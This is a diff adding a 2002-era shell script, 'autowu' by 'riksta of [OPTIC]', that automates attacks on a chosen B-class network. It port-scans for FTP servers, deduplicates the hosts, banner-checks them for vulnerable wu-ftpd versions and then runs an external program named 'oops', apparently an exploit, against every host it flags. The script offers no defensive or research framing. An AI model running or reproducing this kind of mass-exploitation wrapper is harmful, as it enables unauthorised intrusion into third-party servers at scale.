@@ -1,0 +1,59 @@
+#!/bin/sh
+#
+# The following files should be in your directory:
+#
+#     assh
+#     pscan2
+#     ssmod.o
+#     ss
+#     ssvuln
+#     oops
+#     nodupe
+#     targets
+#     x2
+#
+
+if [ $# != 1 ]; then
+        echo " autowu v1.0"
+        echo "   - by riksta of [optic]"
+        echo ""
+        echo " Usage: $0 <b class>"
+        exit;
+fi
+
+
+
+
+
+echo
+echo -e "[\\033[1;31mautowu\033[7;0m] v2.3 ph33r! ... 2002 by \033[0;36mriksta\033[7;0m, an\033[1;31m [OPTIC]\033[7;0mproduction\033[7;0m"
+echo                                     "[ rome wasn't built in a day! ]"
+echo "-> Running pscan2 please wait..."
+rm -rf $1.pscan.21
+./pscan2 $1 21
+
+echo "-> Sleeping for 10s to let pscan finish up."
+sleep 10
+
+cat $1.pscan.21 |sort |uniq > $1.pscan.21.tmp
+rm -rf $1.pscan.21
+./nodupe $1.pscan.21.tmp $1.ssh
+
+pscan=`grep -c . $1.ssh`
+echo "-> Pscan found $pscan hosts running ftpd on unique c ranges."
+echo "-> Checking for vulnerable wu-ftpd versions... hold on cowboy."
+rm -rf $1.ssh.out
+./ssvuln $1.ssh $1.ssh.out 100
+echo "-> Sleeping for 10s to let banner scan finish up."
+sleep 10
+
+cat $1.ssh.out |sort | uniq >$1.ssh.out.new
+mv $1.ssh.out.new $1.ssh.out
+
+numvuln=`grep -c . $1.ssh.out`
+echo "-> Found $numvuln vulnerable hosts..."
+
+./oops $1.ssh.out
+
+echo "-> Complete! Hope you shop with us again."
+
